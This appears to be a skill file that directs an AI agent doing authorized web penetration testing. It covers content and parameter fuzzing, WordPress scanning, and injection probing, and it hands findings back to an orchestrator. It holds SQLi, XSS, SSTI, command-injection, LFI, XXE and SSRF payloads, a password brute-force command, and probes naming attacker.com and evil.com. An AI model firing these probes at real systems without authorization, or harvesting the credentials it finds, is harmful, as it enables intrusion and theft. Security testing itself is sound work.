---
name: web-discovery
description: >
  Discover web application injection points and route to the correct
  exploitation skill during authorized penetration testing.
keywords:
  - find vulns
  - fuzz the target
  - test for injection
  - parameter discovery
  - content discovery
  - web recon
  - find hidden parameters
  - test this endpoint
  - what's vulnerable
  - start web testing
  - web app pentest
  - hunt for bugs
  - wordpress
  - wpscan
tools:
  - ffuf
  - arjun
  - paramspider
  - wpscan
  - burpsuite
opsec: low
---

# Web Vulnerability Discovery

You are helping a penetration tester discover vulnerabilities in a web
application. Your job is to find hidden content, discover parameters, test for
injection points, and categorize findings for the orchestrator. All testing is
under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[web-discovery] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## Scope Boundary

This skill covers web application vulnerability discovery — identifying attack
surface, testing for common vulnerability classes, and reporting findings to
the orchestrator. When you confirm a vulnerability — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Detection details (parameter, payload that triggered, error messages, technology)
  - Context for technique execution (working payloads, DBMS version, framework, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

You MUST NOT:
- Perform SQL injection exploitation (UNION queries, data extraction, OS command
  execution)
- Perform XSS exploitation (cookie theft, DOM manipulation)
- Perform SSTI exploitation (RCE payloads)
- Perform command injection exploitation (`id`, `whoami`, reverse shells,
  system enumeration)
- Perform Python code injection exploitation (`__import__('os')`, file reads,
  reverse shells)
- Perform deserialization exploitation (gadget chains, RCE payloads)
- Perform any other technique-specific exploitation

When you identify an injection point, return to the orchestrator with your
findings. Do not continue past discovery.

## State Management

Call `get_state_summary()` from the state-interim MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

### Interim Writes

Write actionable findings **immediately** via state-interim so the orchestrator
can react in real time (via event watcher) instead of waiting for your full
return summary. Use these tools as you discover findings:

- `add_credential()` — login bypass, default creds, credentials found in config files or backups
- `add_vuln()` — confirmed SQLi, file upload, SSTI, command injection, XSS, or any other confirmed vulnerability class
- `add_pivot()` — internal URLs/hosts found (SSRF targets, API endpoints linking to backend services)
- `add_blocked()` — techniques attempted and failed (so orchestrator doesn't re-route)

Write vhost discoveries as `add_vuln(vuln_type="info")` so the orchestrator
triggers a hosts-file update check. **Do NOT enumerate discovered vhosts** —
the orchestrator spawns a new agent per vhost.
**Do NOT send interim writes if you are near your scope boundary and will be returning to the orchestrator imminently.**

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Target URL or scope defined
- Proxy decision recorded by orchestrator (Burp listener configured or
  explicitly skipped)
- Wordlists available (SecLists: `apt install seclists` or `/usr/share/seclists/`)
- Tools: `ffuf`, `arjun` (`pip install arjun`), `paramspider` (`pip install paramspider`), `wpscan` (`gem install wpscan`)

## Browser Efficiency

When extracting specific data from a page (form values, table contents, API
responses, version strings), use `browser_evaluate` with CSS selectors or
targeted JS instead of `browser_get_page`. Full page dumps via
`browser_get_page` return the entire DOM (often 10-40K chars of navigation,
scripts, and boilerplate) when you only need a few hundred chars of data.

```
# BAD — dumps entire page HTML (~30K chars)
browser_get_page(session_id=...)

# GOOD — targeted extraction (~200 chars)
browser_evaluate(session_id=..., expression="document.querySelector('#version').innerText")
browser_evaluate(session_id=..., expression="document.querySelector('form').outerHTML")
browser_evaluate(session_id=..., expression="[...document.querySelectorAll('table.data tr')].map(r => r.innerText).join('\\n')")
```

Reserve `browser_get_page` for initial page structure discovery when you
don't yet know what elements exist. After identifying the page layout,
switch to `browser_evaluate` for all subsequent data extraction.

## Proxy Handling

If the orchestrator provides a Burp listener (`Web proxy: http://IP:PORT`),
treat it as mandatory for the full discovery run:

- Browser automation: call `browser_open(..., proxy="http://IP:PORT")` or rely
  on `engagement/web-proxy.json` if the orchestrator created it
- Bash HTTP clients: source `engagement/web-proxy.sh`
- Add tool-native proxy flags when available (`curl -x`, `ffuf -x`,
  `wpscan --proxy`, `sqlmap --proxy`)

Do not silently fall back to direct traffic when proxying was requested. If the
operator explicitly skipped proxying, still source `engagement/web-proxy.sh` so
the process environment is reset to direct mode, then rely on saved evidence
files rather than Burp history.

## Step 1: Content Discovery

Find hidden endpoints, directories, and files.

**Wordlist priority:** Start with `quickhits.txt` for fast coverage of common
high-value paths (admin panels, config files, backup files, known endpoints).
Fall back to `raft-small-words.txt` only if quickhits returns nothing
interesting. NEVER use `raft-medium-*` or any medium to large wordlist without
explicit prompts from the orchestrator or operator.

```bash
# Quick high-value path check (run first)
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# Directory discovery (if quickhits insufficient)
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# File discovery
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# Technology-specific files
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://TARGET/FUZZ -e .php,.asp,.aspx,.jsp,.json,.xml,.yaml,.yml,.bak,.old,.swp,.git \
  -mc all -fc 404

# API endpoint discovery
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://TARGET/api/FUZZ -mc all -fc 404

# Virtual host / subdomain discovery
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://TARGET -H "Host: FUZZ.TARGET" -mc all -fs <default-response-size>
```

**Vhost handling:** Vhosts discovered via `Host:` header fuzzing →
`add_vuln(title="Vhost discovered: <vhost>", host="<target>", vuln_type="info", severity="info")`.
**Do NOT enumerate discovered vhosts.** Treat them as out of scope for this
invocation — skip them in all subsequent fuzzing, parameter discovery, and
injection testing. The orchestrator spawns a separate web-discovery agent per
vhost after updating `/etc/hosts`.

## Step 1b: CMS Detection

When content discovery reveals a CMS (WordPress, Drupal, Joomla), run the
appropriate scanner before proceeding to parameter testing. CMS-specific scanners
find plugin/theme vulns, misconfigurations, and exposed endpoints that generic
fuzzing will miss.

**WordPress indicators:** `/wp-content/`, `/wp-admin/`, `/wp-login.php`,
`wp-json` API, `<meta name="generator" content="WordPress`.

```bash
# Full WordPress enumeration — plugins, themes, users, config backups
wpscan --url https://TARGET/ -e ap,at,u --api-token $WPSCAN_API_TOKEN

# Without API token (still finds outdated versions and exposed files)
wpscan --url https://TARGET/ -e ap,at,u

# Aggressive plugin detection (slower, catches less common plugins)
wpscan --url https://TARGET/ -e ap --plugins-detection aggressive

# Password brute-force against discovered users
wpscan --url https://TARGET/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

**What to do with findings:**
- Vulnerable plugin/theme with known exploit → STOP. Report: vulnerability type
  (SQLi, LFI, RCE, file upload, etc.), plugin/theme name and version, CVE if known
- `wp-config.php` backup found → extract DB credentials, write immediately:
  `add_credential(username=..., secret=..., source="wp-config.php on <target>")`,
  and report in return summary
- XML-RPC enabled (`/xmlrpc.php` returns 405) → report for credential brute-force
  via `system.multicall` amplification
- User enumeration successful → report usernames for password spraying
- WordPress admin access gained → STOP. Report: admin access method, available
  escalation paths (theme editor PHP upload, plugin installer)

**Drupal/Joomla:** No dedicated scanner in the standard toolkit. Use `nuclei`
with CMS-specific templates and continue with standard parameter/injection
testing.

## Step 1c: Post-Authentication Settings Enumeration

After gaining any CMS access — self-registration, discovered credentials,
default credentials, even low-privilege roles — enumerate settings and
configuration pages for stored secrets. CMS platforms frequently store
third-party service credentials in admin or settings panels accessible to
authenticated users.

**What to look for:**
- Object storage credentials (access keys, secret keys, bucket names)
- SMTP/mail server credentials
- API tokens and keys (payment gateways, analytics, integrations)
- Database connection strings
- OAuth client secrets
- Backup configuration (paths, remote storage credentials)

**Common CMS settings paths:**
- `/admin/settings`, `/admin/config`, `/dashboard/settings`
- WordPress: `/wp-admin/options-general.php`, `/wp-admin/options.php`
- Drupal: `/admin/config`, `/admin/config/system`
- Joomla: `/administrator/index.php?option=com_config`

**Interim write:** If service credentials are found, write immediately:
`add_credential(username=..., secret=..., credential_type="api_key",
source="CMS settings page on <target>")`. These often unlock additional
attack surface (hidden storage buckets, internal services, backup archives).

## Step 2: Parameter Discovery

Find hidden or undocumented parameters on discovered endpoints.

```bash
# Arjun — automated parameter discovery (GET, POST, JSON, XML)
arjun -u https://TARGET/endpoint
arjun -u https://TARGET/endpoint -m GET POST JSON
arjun -u https://TARGET/endpoint --headers "Authorization: Bearer TOKEN"

# ParamSpider — mine parameters from web archives
paramspider -d TARGET

# ffuf parameter brute-force
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://TARGET/endpoint?FUZZ=test" -mc all -fs <baseline-size>
```

## Step 3: Injection Point Testing

Test discovered parameters with polyglot and type-specific probes.

### Quick Polyglot Probes

These trigger detectable behavior across multiple vulnerability classes:
```
'"><{{7*7}}${7*7}%{{7*7}}
```
```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//
```
```
' OR '1'='1' --
```
```
{{7*7}}${7*7}<%= 7*7 %>
```

### Per-Class Test Payloads

For each class below: inject the probes, observe the response. **The moment any
probe triggers** (error message, evaluated output, time delay, callback), STOP.
Do not try more payloads. Do not attempt exploitation. Write the finding
immediately via `add_vuln()` and return to the orchestrator.

**Interim writes on confirmed injection:**
- SQLi confirmed → `add_vuln(title="SQLi in <param> on <URL>", host="<host>", vuln_type="sqli", severity="high")`
- SSTI confirmed → `add_vuln(title="SSTI (<engine>) in <param> on <URL>", host="<host>", vuln_type="ssti", severity="critical")`
- Command injection → `add_vuln(title="Command injection in <param> on <URL>", host="<host>", vuln_type="rce", severity="critical")`
- SSRF with internal access → `add_pivot(source="SSRF on <URL>", destination="<internal_host>", method="SSRF")`
- Default/discovered credentials → `add_credential(username=..., secret=..., source="<context>")`

**SQL Injection:**
```
'
"
')
")
' OR '1'='1
1 AND 1=2
1 AND 1=1
1' ORDER BY 1--+
```

> **→ ON HIT:** STOP. Report: SQL injection confirmed. Pass: parameter, URL, method, injection type (error-based if DB error with syntax details, boolean-blind if different content for `1=1` vs `1=2`, time-blind if delay on `SLEEP(5)`/`WAITFOR DELAY`, union if `ORDER BY`/`UNION SELECT` returns data, stacked if second statement executes), DBMS fingerprint, error message.

**DBMS fingerprinting** (inject as tautology to identify backend):

| Payload | If True |
|---|---|
| `conv('a',16,2)=conv('a',16,2)` | MySQL |
| `@@CONNECTIONS=@@CONNECTIONS` | MSSQL |
| `5::int=5` | PostgreSQL |
| `ROWNUM=ROWNUM` | Oracle |
| `sqlite_version()=sqlite_version()` | SQLite |

**SSTI:**
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

> **→ ON HIT:** STOP. Report: SSTI confirmed. Disambiguate engine: `{{7*'7'}}` returns `7777777` = Jinja2, returns `49` = Twig. `${7*7}` = Freemarker/Java EL. `<%= 7*7 %>` = ERB. Pass: parameter, URL, template engine, working payload.

**Engine disambiguation** (if `{{7*7}}` returns `49`):

| Follow-Up | Result | Engine |
|---|---|---|
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |

**XSS:**
```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
'-alert(1)-'
javascript:alert(1)
```

> **→ ON HIT:** STOP. Report: XSS confirmed. Pass: parameter, URL, XSS type (reflected if payload in HTML response, stored if persists on subsequent loads, DOM if appears via JS but not in HTTP response body), working payload, context (attribute/tag/script).

**Command Injection:**
```
; id
| id
`id`
$(id)
; sleep 5
```

> **→ ON HIT:** STOP. Report: Command injection confirmed. Pass: parameter, URL, injection type (output-based if command output visible, blind if delay only, OOB if callback received), working payload, OS context.

**Python Code Injection:**
```
7*7
str(7*7)
'A'*3
__import__('os').popen('id').read()
```

> **→ ON HIT:** STOP. Report: Python code injection confirmed. Pass: parameter, URL, working payload, error details. This is NOT command injection (shell operators `;`, `|` don't work) and NOT SSTI (template delimiters `{{}}` return literal).

**Disambiguation from Command Injection and SSTI:**

| Probe | Command Injection | Python Code Injection | SSTI |
|---|---|---|---|
| `; id` | Returns `uid=...` | Error or literal | Error or literal |
| `7*7` | Literal `7*7` | Returns `49` | Literal `7*7` |
| `{{7*7}}` | Literal | Literal `{{7*7}}` | Returns `49` |

**SSRF:**
```
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://COLLABORATOR.oastify.com
```

> **→ ON HIT:** STOP. Report: SSRF confirmed. Pass: parameter, URL, SSRF type (full-read if internal content returned, blind if callback only, cloud if metadata returned), accessible internal hosts/services.

**LFI:**
```
../../etc/passwd
....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

> **→ ON HIT:** STOP. Report: File inclusion confirmed. Pass: parameter, URL, inclusion type (LFI if local file contents, PHP wrapper if base64 from `php://filter`, RFI if remote file loaded), working payload, readable files.

**XXE** (inject into XML input or Content-Type: application/xml):
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

> **→ ON HIT:** STOP. Report: XXE confirmed. Pass: parameter, URL, XXE type (classic if file contents in response, blind/OOB if callback, error-based if file contents in error message), working payload.

**Deserialization** (check for serialized objects in parameters, cookies, headers):
```
# Java: look for AC ED 00 05 (hex) or rO0AB (base64)
rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbs...

# PHP: look for O: or a: prefix
O:8:"stdClass":1:{s:1:"a";s:1:"b";}

# .NET: look for AAEAAAD (base64) or $type in JSON
{"$type":"System.Object"}
```

> **→ ON HIT:** STOP. Report: Deserialization confirmed. Pass: parameter, URL, language/framework (Java if `rO0AB`/`AC ED 00 05`, PHP if `O:`/`a:`, .NET if `AAEAAAD`/`$type`/ViewState, or infer from error: `ObjectInputStream`=Java, `unserialize`=PHP, `BinaryFormatter`=.NET), error message.

**JWT** (check Authorization headers, cookies, and parameters for `eyJ` prefix):
```
# Identify JWTs — three Base64URL segments separated by dots
# Header always starts with eyJ (base64 of {"...)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature

# Decode header to check algorithm
echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
# {"alg":"HS256","typ":"JWT"}
```

> **→ ON HIT:** STOP. Report: JWT authentication found. Pass: JWT location (header/cookie/parameter), algorithm (`alg` value), header fields (`kid`/`jku`/`x5u` if present), JWKS endpoint URL if found, sample decoded header+payload.

**File Upload** (test upload endpoints for bypass opportunities):
```
# Find upload endpoints (forms, API, drag-and-drop handlers)
# Upload a benign file, note:
# - Allowed extensions
# - Where the file is stored (URL in response? predictable path?)
# - Whether the file is served back with original Content-Type

# Test extension bypass — try alternative extensions for the target language:
# PHP: .phtml, .pht, .php5, .php7, .phar, .phps, .php.jpg
# ASP: .aspx, .ashx, .asmx, .asp, .config, .shtml
# JSP: .jspx, .jsw, .jsv, .jspf, .war
# Test double extension: shell.php.jpg, shell.jpg.php

# Test config file upload:
# .htaccess (Apache), web.config (IIS), .user.ini (PHP-FPM)
```

> **→ ON HIT:** STOP. Report: File upload vulnerability found. Pass: upload endpoint URL, allowed/blocked extensions, storage path if known, whether uploaded files are served back with original Content-Type, whether server-side execution was confirmed or just upload accepted.

**NoSQL Injection** (test JSON APIs and Node.js backends):
```
# URL-encoded operator injection
param[$ne]=test
param[$gt]=
param[$exists]=true

# JSON body operator injection
{"param": {"$ne": ""}}
{"param": {"$gt": ""}}
{"param": {"$regex": ".*"}}
```

> **→ ON HIT:** STOP. Report: NoSQL injection confirmed. Pass: parameter, URL, injection type (auth bypass if `$ne`/`$gt`/`$regex` succeeds, error-based if MongoDB error, blind if different response for operators), working payload, backend (MongoDB/CouchDB).

**LDAP Injection** (test login forms and search fields backed by LDAP/AD):
```
# Wildcard — if login succeeds or search returns results, LDAP may be in play
*

# Filter breakout — triggers error if LDAP filter is parsed
)(cn=*))(|(cn=*

# Always-true injection in AND context
admin)(&)

# Error trigger
\
```

> **→ ON HIT:** STOP. Report: LDAP injection confirmed. Pass: parameter, URL, injection type (wildcard bypass if `*` succeeds, error-based if LDAP error, filter breakout if `)(cn=*)` changes response), working payload, backend context.

**Request Smuggling** (test for CL/TE desync on multi-tier architectures):
```
# Check for mixed HTTP version (H2 front-end, H1 back-end)
curl -sI --http2 https://TARGET/ -o /dev/null -w '%{http_version}\n'

# Check headers for reverse proxy / CDN indicators
curl -sI https://TARGET/ | grep -iE 'server|via|x-cache|x-forwarded'

# Automated detection with smuggler.py
python3 -m smuggler -u https://TARGET/
```

> **→ ON HIT:** STOP. Report: Request smuggling detected. Pass: target URL, desync type (CL.TE/TE.CL/H2), front-end/back-end identification, HTTP version details, smuggler.py output.

**IDOR / Broken Access Control** (test endpoints that reference objects by ID):
```
# Identify object references in API responses
# Look for: sequential integers, UUIDs, MongoDB ObjectIds, encoded IDs
# Test: change the ID while keeping your auth session

# Horizontal: access another user's resource
GET /api/users/OTHER_ID/profile  (with your session cookie)

# Vertical: access admin endpoints
GET /api/admin/users  (with low-priv session)

# Method tampering: try PUT/DELETE on read-only resources
PUT /api/users/OTHER_ID/profile
DELETE /api/users/OTHER_ID/documents/123
```

> **→ ON HIT:** STOP. Report: IDOR / broken access control confirmed. Pass: endpoint URL, ID parameter, access type (horizontal if other user's data, vertical if admin data with low-priv, state-changing if write succeeds), affected resource type.

**CORS Misconfiguration** (check cross-origin headers on sensitive endpoints):
```bash
# Test origin reflection
curl -sI -H "Origin: https://evil.com" https://TARGET/api/endpoint \
  | grep -i "access-control"

# Test null origin
curl -sI -H "Origin: null" https://TARGET/api/endpoint \
  | grep -i "access-control"

# Look for: Access-Control-Allow-Origin reflecting input + Allow-Credentials: true
```

> **→ ON HIT:** STOP. Report: CORS misconfiguration confirmed. Pass: endpoint URL, misconfiguration type (origin reflection + credentials, null origin + credentials, wildcard on sensitive endpoint), ACAO/ACAC header values.

**CSRF** (check state-changing endpoints for token protection):
```
# Capture a POST request to a state-changing endpoint (change email, password, etc.)
# Remove or empty the CSRF token parameter — does the request still succeed?
# Check SameSite cookie attribute:
curl -sI https://TARGET/login | grep -i "set-cookie" | grep -i "samesite"
# Check for custom header requirements (X-CSRF-Token, X-Requested-With)
```

> **→ ON HIT:** STOP. Report: CSRF confirmed. Pass: endpoint URL, state-changing action, bypass type (missing token, token removable, SameSite=None, GET-based), affected functionality.

**OAuth / OpenID Connect** (check for OAuth-based authentication):
```bash
# Detect OAuth endpoints
curl -s "https://TARGET/.well-known/openid-configuration" | jq .

# Look for OAuth parameters in login flow:
# client_id, redirect_uri, response_type, state, scope
# Check Authorization header for Bearer tokens
# Check for social login buttons (Google, Facebook, GitHub, Apple)
```

> **→ ON HIT:** STOP. Report: OAuth/OIDC attack surface found. Pass: OAuth endpoint URLs, redirect_uri validation behavior, state parameter presence, token type (JWT or opaque), discovery endpoint if found.

**Password Reset** (check reset flow for token theft vectors):
```
# Request password reset, analyze the email link:
# - Does the link domain come from the Host header?
# - Is the token short/predictable?
# - Does the reset page load external resources (Referer leakage)?
# Test Host header override:
curl -s -X POST -H "X-Forwarded-Host: attacker.com" \
  -d "email=test@target.com" "https://TARGET/reset-password"
```

> **→ ON HIT:** STOP. Report: Password reset vulnerability found. Pass: reset endpoint URL, vulnerability type (host header poisoning if domain changes, token weakness if short/predictable, Referer leakage if external resources loaded), observed behavior.

**2FA / MFA** (check for second-factor bypass):
```
# After login with valid credentials, test 2FA enforcement:
# - Can you skip 2FA by navigating directly to /dashboard?
# - Does submitting an empty/null code work?
# - Is there rate limiting on OTP attempts?
# - Check SameSite cookie attribute on session cookies
# - Check for alternative login paths (OAuth, API, mobile)
```

> **→ ON HIT:** STOP. Report: 2FA bypass opportunity found. Pass: 2FA endpoint URL, bypass type (force browse if direct navigation works, null code if empty OTP accepted, brute-force if no rate limit), authentication flow details.

**Race Conditions** (check state-changing endpoints for concurrent request handling):
```
# Identify race-susceptible endpoints:
# - Coupon/promo code redemption
# - Balance transfers and payments
# - Vote/like/rating endpoints
# - Single-use token consumption (invite codes, reset tokens)

# Check HTTP/2 support (enables single-packet attack)
curl -sI --http2 https://TARGET/ -o /dev/null -w '%{http_version}\n'

# Quick race test: send identical POST to state-changing endpoint
# using Burp Repeater "Send group in parallel" (HTTP/2)
# or duplicate tabs × 10-20 and fire simultaneously
```

> **→ ON HIT:** STOP. Report: Race condition candidate found. Pass: endpoint URL, susceptible action (coupon/transfer/vote/token), HTTP/2 availability, observed behavior under concurrent requests.

STOP and return to the orchestrator with:
- What was found (categorized by type: injection, auth bypass, file access, etc.)
- Detection details (parameter, payload that triggered, error messages, technology)
- Recommended priority based on impact and confidence
- Context for technique execution (working payloads, DBMS version, framework, etc.)

## Troubleshooting

### WAF Blocking Requests
```bash
# Rate limiting
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -rate 50

# Rotate User-Agents
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Auto-calibrate to filter noise
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -ac
```

### Too Many False Positives
```bash
# Baseline normal response size
curl -s https://TARGET/nonexistent-page | wc -c

# Filter by size (-fs), word count (-fw), or line count (-fl)
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -fs <baseline-size>
```

### Parameter Discovery Returns Nothing
- Try POST: `arjun -u URL -m POST`
- Try JSON body: `arjun -u URL -m JSON`
- Check JavaScript files for parameters (LinkFinder, JSParser)
- Mine Wayback Machine: `paramspider -d TARGET`
- Check Burp history for parameters seen in-session
